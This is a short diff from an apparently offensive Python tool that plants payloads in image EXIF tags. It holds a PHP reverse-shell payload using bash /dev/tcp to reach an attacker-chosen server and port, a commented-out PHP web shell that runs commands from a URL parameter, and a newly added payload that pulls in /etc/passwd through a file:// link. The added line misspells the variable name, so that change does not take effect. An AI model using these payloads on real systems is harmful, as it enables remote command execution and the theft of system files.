@@ -34,7 +34,8 @@ if not argv.input:
     exit()
 if not argv.payload:
     #argv.payload = "<?php echo \"<pre>\"; system($_GET['cmd']) ?>"
-    argv.payload = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/{}/{} 0>&1\'"); ?>'.format(argv.server, argv.port)
+    #argv.payload = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/{}/{} 0>&1\'"); ?>'.format(argv.server, argv.port)
+    argv.paylod = "<link rel='attachment' href='file:///etc/passwd'></link>"
 try:
     for exif in exif_tags:
         each_tag = "-{}={}".format(exif, argv.payload)
